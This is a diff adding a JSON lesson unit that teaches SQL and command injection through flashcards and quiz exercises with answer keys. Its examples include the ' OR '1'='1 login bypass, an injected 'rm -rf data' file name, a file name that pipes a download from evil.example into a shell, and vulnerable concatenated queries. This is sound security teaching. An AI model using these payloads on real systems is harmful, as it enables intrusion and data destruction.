@@ -1,0 +1,170 @@
+{
+ "unit": {
+  "id": "sec-4",
+  "subjectId": "secu",
+  "topic": "secu",
+  "world": "secu-w2",
+  "title": "Injection: SQL and commands",
+  "description": "SQL injection, parameterized queries, ORMs, untrusted input, command injection, database rights"
+ },
+ "cards": [
+  {
+   "slug": "injection",
+   "level": "debutant",
+   "term": "Injection",
+   "definition": "A flaw where user input is mixed into code (SQL, a shell command) and gets executed as code instead of being treated as data.",
+   "example": "A search box whose text ends up inside a database query."
+  },
+  {
+   "slug": "sql-injection",
+   "level": "debutant",
+   "term": "SQL injection",
+   "definition": "Injection into a database query: the attacker writes SQL in a field to read, change or delete data.",
+   "example": "Typing a quote and OR 1=1 in a login field to bypass the password check."
+  },
+  {
+   "slug": "parameterized-query",
+   "level": "debutant",
+   "term": "Parameterized query",
+   "definition": "A query where values are sent separately from the SQL text, through placeholders, so they can never be run as SQL.",
+   "example": "db.execute(\"SELECT * FROM users WHERE email = ?\", (email,))"
+  },
+  {
+   "slug": "untrusted-input",
+   "level": "debutant",
+   "term": "Untrusted input",
+   "definition": "Any data coming from outside your code: forms, URL parameters, headers, cookies, uploaded files, third-party APIs.",
+   "example": "Even a hidden form field can be changed by the user."
+  },
+  {
+   "slug": "orm",
+   "level": "debutant",
+   "term": "ORM",
+   "definition": "A library that turns database rows into objects and builds parameterized queries for you, such as SQLAlchemy or Prisma.",
+   "example": "User.objects.filter(email=email) never glues text into SQL."
+  },
+  {
+   "slug": "command-injection",
+   "level": "debutant",
+   "term": "Command injection",
+   "definition": "Injection into a shell command: input such as a file name carries extra commands that the server runs.",
+   "example": "A file named photo.png; rm -rf data passed to os.system."
+  }
+ ],
+ "exercises": [
+  {
+   "kind": "qcm",
+   "prompt": "What is wrong with this code?",
+   "choices": [
+    "User input is glued into the SQL text: SQL injection",
+    "A semicolon is missing at the end",
+    "SELECT * is a bit slow",
+    "Emails cannot be stored in SQL"
+   ],
+   "explain": "Whatever the user types becomes part of the query. A quote in the input lets them rewrite the condition.",
+   "code": {
+    "lang": "python",
+    "src": "email = request.form[\"email\"]\nquery = \"SELECT * FROM users WHERE email = '\" + email + \"'\"\ndb.execute(query)"
+   }
+  },
+  {
+   "kind": "qcm",
+   "prompt": "In that code, an attacker types  ' OR '1'='1  in the email field. What happens?",
+   "choices": [
+    "The condition is always true: every user returns",
+    "The page only shows an error message",
+    "Nothing happens, the input is ignored",
+    "The current user is logged out"
+   ],
+   "explain": "The query becomes WHERE email = '' OR '1'='1', which is true for every row."
+  },
+  {
+   "kind": "qcm",
+   "prompt": "What is the main fix for SQL injection?",
+   "choices": [
+    "Parameterized queries: values are sent apart from the SQL",
+    "Removing quotes from the input by hand",
+    "Limiting the length of the input",
+    "Hiding the error messages"
+   ],
+   "explain": "With placeholders, the database knows which part is code and which part is data. Escaping by hand always misses a case."
+  },
+  {
+   "kind": "compose",
+   "prompt": "Build a safe query that reads the user whose id is user_id.",
+   "lang": "python",
+   "tokens": [
+    "db.execute(",
+    "\"SELECT * FROM users WHERE id = ?\"",
+    ",",
+    "(user_id,)",
+    ")"
+   ],
+   "extra": [
+    "+",
+    "str(user_id)"
+   ],
+   "explain": "The SQL text holds a placeholder (?) and the value travels separately, in a tuple. No + between SQL and input."
+  },
+  {
+   "kind": "vf",
+   "prompt": "Using an ORM properly, without raw SQL built from input, protects against most SQL injection.",
+   "isTrue": true,
+   "explain": "True: ORMs build parameterized queries. The danger comes back the moment you write raw SQL with concatenated input."
+  },
+  {
+   "kind": "vf",
+   "prompt": "Hiding SQL error messages from users fixes SQL injection.",
+   "isTrue": false,
+   "explain": "False: it hides useful clues, which is good, but the query is still injectable. Attackers have blind techniques that need no error message."
+  },
+  {
+   "kind": "qcm",
+   "prompt": "A server runs os.system(\"convert \" + filename + \" out.png\") with a file name sent by the user. Which attack does this allow?",
+   "choices": [
+    "Command injection",
+    "SQL injection",
+    "XSS",
+    "CSRF"
+   ],
+   "explain": "A name like x.png; curl evil.example | sh adds a second command. Use a list of arguments (subprocess.run with a list) and validate the name."
+  },
+  {
+   "kind": "qcm",
+   "prompt": "Which data should your server treat as untrusted?",
+   "choices": [
+    "All of it: forms, URL, headers, cookies, files",
+    "Only the text typed in the forms",
+    "Only what anonymous visitors send",
+    "Nothing that logged-in users send"
+   ],
+   "explain": "Logged-in users can be attackers too, and any part of a request can be forged. Validate and parameterize everywhere."
+  },
+  {
+   "kind": "bugline",
+   "prompt": "Which line makes this Node.js route vulnerable to SQL injection?",
+   "lang": "js",
+   "lines": [
+    "app.get(\"/product\", async (req, res) => {",
+    "  const id = req.query.id;",
+    "  const sql = \"SELECT * FROM products WHERE id = \" + id;",
+    "  const rows = await db.query(sql);",
+    "  res.json(rows);",
+    "});"
+   ],
+   "answer": 2,
+   "explain": "The id from the URL is glued into the SQL text. Use db.query(\"SELECT * FROM products WHERE id = $1\", [id])."
+  },
+  {
+   "kind": "qcm",
+   "prompt": "Which database account should your web app use?",
+   "choices": [
+    "One limited to the tables and actions it needs",
+    "The superuser account, for simplicity",
+    "A shared admin account for the whole team",
+    "The root account, with its password in the code"
+   ],
+   "explain": "If an injection slips through, a limited account cannot drop tables or read everything. Least privilege again."
+  }
+ ]
+}
